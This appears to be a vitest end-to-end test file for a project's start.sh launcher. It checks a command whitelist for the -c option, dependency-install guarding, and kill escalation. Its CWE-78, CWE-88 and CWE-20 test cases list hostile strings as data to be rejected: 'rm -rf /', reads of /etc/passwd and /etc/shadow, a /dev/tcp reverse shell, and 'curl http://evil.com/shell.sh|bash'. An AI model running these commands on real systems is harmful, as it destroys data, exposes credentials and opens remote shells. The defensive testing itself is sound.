// Copyright (c) 2025-2026 Huawei Technologies Co., Ltd.
// This program is free software, you can redistribute it and/or modify it under the terms and conditions of
// CANN Open Software License Agreement Version 2.0 (the "License").
// Please refer to the License for details. You may not use this file except in compliance with the License.
// THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED,
// INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT, MERCHANTABILITY, OR FITNESS FOR A PARTICULAR PURPOSE.
// See LICENSE in the root of the software repository for the full text of the License.

import { describe, it, expect } from 'vitest';
import { execSync, spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

// tests/e2e → 包根需退两层（分层重构挪目录时少改了一层，bash 退 127）
const PROJECT_ROOT = path.resolve(__dirname, '..', '..');
const START_SH = path.join(PROJECT_ROOT, 'start.sh');

const ALLOWED_COMMANDS = ['tui', 'sessions', 'session', 'turn', 'search', 'compare', 'stats', 'import', 'delete', 'config'];

function isValidCliCmd(input: string): boolean {
  if (!input) return false;
  return ALLOWED_COMMANDS.includes(input);
}

function runStartSh(cliArg: string): { exitCode: number; stderr: string } {
  try {
    execSync(`bash "${START_SH}" -c '${cliArg.replace(/'/g, "'\\''")}'`, {
      timeout: 5000,
      encoding: 'utf-8',
      stdio: 'pipe',
    });
    return { exitCode: 0, stderr: '' };
  } catch (err: any) {
    return {
      exitCode: err.status ?? 1,
      stderr: err.stderr ?? '',
    };
  }
}

describe('start.sh -c parameter validation', () => {
  describe('whitelist logic: exact string match', () => {
    for (const cmd of ALLOWED_COMMANDS) {
      it(`accepts: ${cmd}`, () => {
        expect(isValidCliCmd(cmd)).toBe(true);
      });
    }

    it('rejects empty string', () => {
      expect(isValidCliCmd('')).toBe(false);
    });

    const invalid = ['foo', 'bash', 'sh', 'exec', 'eval', 'run', 'npm', 'node'];
    for (const cmd of invalid) {
      it(`rejects unknown: ${cmd}`, () => {
        expect(isValidCliCmd(cmd)).toBe(false);
      });
    }
  });

  describe('CWE-78: shell metacharacter injection', () => {
    const payloads = [
      'tui;rm -rf /',
      'tui ; cat /etc/passwd',
      'tui;;echo hacked',
      'tui|cat /etc/passwd',
      'tui||rm -rf /',
      'tui&&whoami',
      'tui`whoami`',
      'tui$(whoami)',
      'tui&sleep 100',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('CWE-88: argument delimiter injection', () => {
    const payloads = [
      'tui --server http://evil.com',
      'tui --evil-flag',
      'tui=evil',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('CWE-20: input validation edge cases', () => {
    const payloads = [
      '../etc/passwd',
      'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
      'curl http://evil.com/shell.sh|bash',
      'echo d2hvYW1p | base64 -d | bash',
      'tui$(cat /etc/shadow)',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('integration: start.sh rejects malicious -c and exits 1', () => {
    const rejectPayloads = [
      'tui;rm -rf /',
      'tui|cat /etc/passwd',
      'tui&&whoami',
      'bash -i >&/dev/tcp/10.0.0.1/8080 0>&1',
      'foo',
    ];
    for (const payload of rejectPayloads) {
      it(`start.sh exits 1 for: ${payload}`, () => {
        const result = runStartSh(payload);
        expect(result.exitCode).toBe(1);
        expect(result.stderr).toContain('Invalid CLI command');
      });
    }
  });
});

// 依赖实装守卫（npm ls 校验，cpx install.sh 同款纪律）：git pull 拉到新依赖
// 声明而旧 node_modules 未重装时，start.sh 此前只查目录存在会跳过 npm
// install → next build 期 Module not found（现场：存量部署机 Turbopack
// Can't resolve '7zip-bin'，报错不指向真因）。源码级锁 + 行为级锁
// （kill_all_insight IT 同款单函数提取执行，stub npm 记录调用与退出码）。
describe('start.sh 依赖实装守卫（旧 node_modules × 新依赖声明 → 自动补装）', () => {
  it('源码级：守卫用 npm ls 校验实装状态（回退成目录存在性检查即红）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    expect(src).toContain('npm ls --omit=dev --depth=0');
    expect(src).not.toMatch(/\[ ! -d "node_modules" \]/);
  });

  function runGuardCase(opts: {
    nodeModules: boolean; lsExit: number; installExit: number; update: boolean;
  }): { guardExit: number; npmLog: string; stdout: string; errText: string } {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-deps-it-'));
    try {
      const stubBin = path.join(dir, 'bin');
      fs.mkdirSync(stubBin, { recursive: true });
      if (opts.nodeModules) fs.mkdirSync(path.join(dir, 'node_modules'));
      const npmLog = path.join(dir, 'npm.log');
      fs.writeFileSync(path.join(stubBin, 'npm'), [
        '#!/usr/bin/env bash',
        `printf '%s\\n' "$*" >> ${JSON.stringify(npmLog)}`,
        'case "$1" in',
        `  ls) exit ${opts.lsExit} ;;`,
        `  install) exit ${opts.installExit} ;;`,
        'esac',
        'exit 0',
        '',
      ].join('\n'));
      fs.chmodSync(path.join(stubBin, 'npm'), 0o755);
      // 源码级单函数提取执行（不动 start.sh 其余逻辑）；提取失败即红
      const fn = execSync(
        `sed -n '/^install_deps_if_needed() {/,/^}/p' ${JSON.stringify(START_SH)}`,
        { encoding: 'utf8' },
      );
      expect(fn).toContain('npm ls');
      const runner = path.join(dir, 'runner.sh');
      fs.writeFileSync(runner, [
        `UPDATE=${opts.update}`,
        `source ${JSON.stringify(path.join(dir, 'fn.sh'))}`,
        'install_deps_if_needed 2>guard.err',
        'echo "GUARD_EXIT=$?"',
      ].join('\n'));
      fs.writeFileSync(path.join(dir, 'fn.sh'), fn);
      const stdout = execSync(`bash ${JSON.stringify(runner)}`, {
        encoding: 'utf8',
        cwd: dir,
        env: { ...process.env, PATH: `${stubBin}:${process.env.PATH ?? ''}` },
      });
      const errFile = path.join(dir, 'guard.err');
      return {
        guardExit: parseInt((stdout.match(/GUARD_EXIT=(\d+)/) ?? [])[1] ?? '-1', 10),
        npmLog: fs.existsSync(npmLog) ? fs.readFileSync(npmLog, 'utf8') : '',
        stdout,
        errText: fs.existsSync(errFile) ? fs.readFileSync(errFile, 'utf8') : '',
      };
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  }

  it('健康树：npm ls 通过 → install 不触发，守卫放行', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 0, installExit: 0, update: false });
    expect(r.guardExit).toBe(0);
    expect(r.npmLog).not.toContain('install');
  });

  it('用户现场形态：node_modules 存在但缺件（npm ls 失败）→ 自动补装', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 1, installExit: 0, update: false });
    expect(r.guardExit).toBe(0);
    expect(r.npmLog).toContain('install');
  });

  it('无 node_modules：直接安装', () => {
    const r = runGuardCase({ nodeModules: false, lsExit: 1, installExit: 0, update: false });
    expect(r.guardExit).toBe(0);
    expect(r.npmLog).toContain('install');
  });

  it('缺件且安装失败：fail-fast 退出 1（不裸奔进 build 给出误导性 Module not found）', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 1, installExit: 1, update: false });
    expect(r.guardExit).toBe(1);
    expect(r.errText).toContain('deps incomplete');
  });

  it('-u 更新且安装失败：旧依赖完整可用，不阻断（non-fatal）', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 0, installExit: 1, update: true });
    expect(r.guardExit).toBe(0);
    expect(r.errText).toContain('non-fatal');
  });
});
// 启动关键路径不被 git-lfs 自举预取阻塞：start.sh 调 cpx install.sh 时必须
// 钉 CPX_SKIP_LFS_SETUP=1（GitHub 直连受限时预取会阻塞 ~2min，实测拉长
// "杀旧→Ready" 停机窗口）。源码级锁——env 前缀被移除即红。
describe('start.sh cpx 安装步骤跳过 git-lfs 自举预取', () => {
  it('PROXY_INSTALL 调用行带 CPX_SKIP_LFS_SETUP=1（启动关键路径零网络等待）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    const m = src.match(/^(\s*)if (\S+) bash "\$PROXY_INSTALL"/m);
    expect(m, '未找到 PROXY_INSTALL 调用行（重构须同步本测试）').toBeTruthy();
    expect(m![2]).toBe('CPX_SKIP_LFS_SETUP=1');
  });
});

// -k 击杀升级（SIGTERM → 宽限 → SIGKILL）：next-server 对 SIGTERM 走
// graceful close——LISTEN 释放但进程与浏览器 keep-alive 连接双等死锁，
// 浏览器复用旧连接永远转圈（实测 2026-09-20）。行为级 IT：仿真一个忽略
// SIGTERM 的 "next-server"（cmdline 含 next-server + cwd 在假包根，命中
// kill_all_insight 的匹配条件），函数必须在宽限后 SIGKILL 补刀——只有
// SIGTERM 的旧实现杀不掉它，即红。SCRIPT_DIR 指向假包根，真实例零波及。
describe('start.sh -k 击杀升级（SIGTERM 挂死 → SIGKILL 补刀）', () => {
  it('忽略 SIGTERM 的 next-server 残存进程在宽限后被 SIGKILL', async () => {
    const fakeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-kill-it-'));
    try {
      fs.writeFileSync(path.join(fakeRoot, 'next-server-fake.js'),
        "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000);\n");
      const fake = spawn(process.execPath, [path.join(fakeRoot, 'next-server-fake.js')], {
        cwd: fakeRoot,
        stdio: 'ignore',
      });
      const exited = new Promise<number>((resolve) => fake.on('exit', (c) => resolve(c ?? -1)));

      // 源码级单函数提取执行（不动 start.sh 其余逻辑）；先锁升级语义存在
      const fn = execSync(
        `sed -n '/^kill_all_insight() {/,/^}/p' ${JSON.stringify(START_SH)}`,
        { encoding: 'utf8' },
      );
      expect(fn).toContain('kill -9');
      const runner = path.join(fakeRoot, 'runner.sh');
      fs.writeFileSync(runner, [
        `SCRIPT_DIR=${JSON.stringify(fakeRoot)}`,
        `source ${JSON.stringify(path.join(fakeRoot, 'fn.sh'))}`,
        'kill_all_insight',
      ].join('\n'));
      fs.writeFileSync(path.join(fakeRoot, 'fn.sh'), fn);
      execSync(`bash ${JSON.stringify(runner)}`, { encoding: 'utf8', timeout: 20_000 });

      // 仿真件忽略 SIGTERM：只有 SIGKILL 能终结它——宽限后不死即升级失效
      const code = await Promise.race([
        exited,
        new Promise<number>((_, rej) => setTimeout(() => rej(new Error('仿真件未被 SIGKILL：击杀升级失效')), 8_000)),
      ]);
      expect(code).toBeLessThan(0);
    } finally {
      fs.rmSync(fakeRoot, { recursive: true, force: true });
    }
  }, 30_000);
});
